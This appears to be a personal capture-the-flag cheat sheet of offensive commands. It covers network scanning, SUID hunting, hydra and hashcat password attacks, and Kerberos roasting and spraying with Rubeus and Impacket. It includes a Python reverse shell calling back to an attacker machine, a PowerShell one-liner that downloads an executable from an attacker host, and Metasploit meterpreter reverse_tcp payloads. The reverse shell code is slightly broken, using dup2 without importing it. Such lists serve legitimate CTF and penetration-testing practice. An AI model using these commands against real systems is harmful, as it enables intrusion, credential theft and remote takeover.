# writeUp
Just my write up for CTF


# footprinting & scanning
## Ping Sweeping
```console
$ fping –a –g 10.54.12.0/24 2> /dev/null 
$ fping –a –g 10.54.12.010.54.12.255 2> /dev/null 
```

## Nmap
```
## -sn
# nmap –sn 200.200.0.0/16
# nmap –sn 200.200.123.1-12
# nmap –sn 172.16.12.*
# nmap –sn 200.200.12-13.* 
## –iL <inputlist.txt>
```
# cheat sheet

## SSH "Konami Code" (SSH Control Sequences) 
link [here](https://www.sans.org/blog/using-the-ssh-konami-code-ssh-control-sequences/)
## wpscan
https://www.cyberpunk.rs/wpscan-usage-example
## SUID
use **suid3num.py**
```console
$ find / -user root -perm -4000 -exec ls -ldb {} \; 2> /dev/null # scan the whole file system to find all files with the SUID bit set that is own by root
$ find / -perm -4000 -exec ls -ldb {} \; 2>/dev/null
$ find / -perm -u=s -type f 2>/dev/null
$ find / -perm -4000 -exec ls -ldb {} \; 2> /dev/null # same as about but own by any user
$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null # both SUID and SUIG
```
## nmap
```console
$ nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse $IP #smb
$ nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount $IP # rpcbind
```
## powershell
```
powershell -command "IEX (New-Object System.Net.WebClient).Downloadfile('http://<ip>:<port>/shell2.exe','shell2.exe')"
powershell -c "Invoke-WebRequest -Uri 'web' -OutFile 'out'"
```
## gobuster
- -k – Skip verification of SSL certificates.
```console
$ gobuster dir -u http://$IP/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -x html,php,txt -t 54
```
## Password atk
### Hashcat
```console
$ hashcat -m <op> -a 0 -o crack.txt 'hash' /usr/share/wordlists/rockyou.txt --force
$ hashcat -m 13100 -a 0 hash.txt Pass.txt --force # kerberos 
```
### john
```console
root@kali:~# john -wordlist=/usr/share/wordlists/rockyou.txt <hash>
```
### hydra
credit noxtal cheatsheet, check [here](https://noxtal.com/cheatsheets/2020/07/24/hydra-cheatsheet/)
```console
$ hydra -f -l user -P /usr/share/wordlists/rockyou.txt $IP -t 64 ssh
$ hydra -f -t 64 -l user -P /usr/share/wordlists/rockyou.txt $IP mysql
$ hydra -f -t 64 -l user -P /usr/share/wordlists/rockyou.txt $IP ftp
$ hydra -f -t 64 -l user -P /usr/share/wordlists/rockyou.txt $IP smb
$ hydra -t 64 -l user -P /usr/share/wordlists/rockyou.txt $IP http-post-form "/login.php:username=^USER^&password=^PASS^:Login Failed"
$ hydra -f -t 64 -l user -P /usr/share/wordlists/rockyou.txt $IP -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' #wordpress
$ hydra -f -t 64 -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$IP
$ hydra -t 64 -l username -P /usr/share/wordlists/rockyou.txt pop3://$IP #pop3
$ hydra -L users.txt -P pass.txt telnet://target.server # telnet
```
## Reverse SSH port forwarding
```console
$ ssh -L <LPORT>:<RHOST>:<RPROT> <username>@$IP
```
## python revs shell
```py
import socket
import pty
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("kali ip",9696))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)
pty.spawn("/bin/bash")
```


## TTY shell
```console
$ python -c 'import pty; pty.spawn("/bin/sh")'
$ python3 -c 'import pty; pty.spawn("/bin/sh")'
$ echo os.system('/bin/bash')
$ /bin/sh -i
```
# Linux capa
```console
$ getcap -r / 2>/dev/null
```
# cronjob
```console
$ for i in d hourly daily weekly monthly; do echo; echo "--cron.$i--"; ls -l /etc/cron.$i; done
```
# echo "#!/bin/bash"
```console
$ set +H
$ echo "#!/bin/bash" > shell.sh
```
# msfconsole
### linux
```
use multi/handler
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST [HOST IP]
set LPORT [LISTENING_PORT]
exploit
```
## msfvenom
### php
```
msfvenom -p php/meterpreter/reverse_tcp lhost=tun0 lport=1234 R
```
## curl
```console
kali@kali:~$ curl http://10.10.10.204:8081/ctf/get
thm{162520bec925bd7979e9ae65a725f99f}kali@kali:~$ ^C
kali@kali:~$ curl -d 'flag_please' http://10.10.10.204:8081/ctf/post
thm{3517c902e22def9c6e09b99a9040ba09}kali@kali:~$ ^C
kali@kali:~$ curl http://10.10.10.204:8081/ctf/getcookie
Check your cookies!kali@kali:~$ curl http://10.10.10.204:8081/ctf/getcookie -i
HTTP/1.1 200 OK
Set-Cookie: flag=thm{91b1ac2606f36b935f465558213d7ebd}; Path=/
Date: Fri, 17 Jul 2020 12:44:02 GMT
Content-Length: 19
Content-Type: text/plain; charset=utf-8

Check your cookies!                                                                                               
kali@kali:~$ curl http://10.10.10.204:8081/ctf/sendcookie -i --cookie flagpls=flagpls                                                         
HTTP/1.1 200 OK                                                                                    
Date: Fri, 17 Jul 2020 12:46:55 GMT                                                                
Content-Length: 37                                                                                 
Content-Type: text/plain; charset=utf-8

thm{c10b5cb7546f359d19c747db2d0f47b3}
```


## Attacking Kerberos
### kerbrute: user enum
```Console
$ ./kerbrute userenum --dc example.local -d example.local users.txt
```
https://github.com/GhostPack/Rubeus
### Harvesting Tickets
on victim machine
```powershell
$ ./Rubeus.exe harvest /interval:30 # harvest for TGTs every 30 seconds
```
### Brute-Forcing / Password-Spraying
Before password spraying with Rubeus, you need to add the domain controller domain name to the windows host file. You can add the IP and domain name to the hosts file from the machine by using the echo command: ```echo <ip> example.local >> C:\Windows\System32\drivers\etc\hosts```
```powershell
$ ./Rubeus.exe brute /password:<password> /noticket # This will take a given password and "spray" it against all found users then give the .kirbi TGT for that user 
```
### Kerberoasting
on kali, `hashcat -m 13100`
#### Rubeus
on victim machine
```powershell
$ ./Rubeus.exe kerberoast
```
#### Impacket
```console
$ sudo python3 GetUserSPNs.py example.local/username:password -dc-ip $IP -request
```
### AS-REP Roasting
on kali, `hashcat -m 18200`
#### Rubeus
on victim machine
```powershell
$ ./Rubeus.exe asreproast
```
#### impacket
```shell
# check ASREPRoast for all domain users (credentials required)
python GetNPUsers.py <domain_name>/<domain_user>:<domain_user_password> -request -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>

# check ASREPRoast for a list of users (no credentials required)
python GetNPUsers.py <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
```



## etc
```console
$ usermod -aG sudo [user] # adds a user to the Sudo Group on Linux:
```
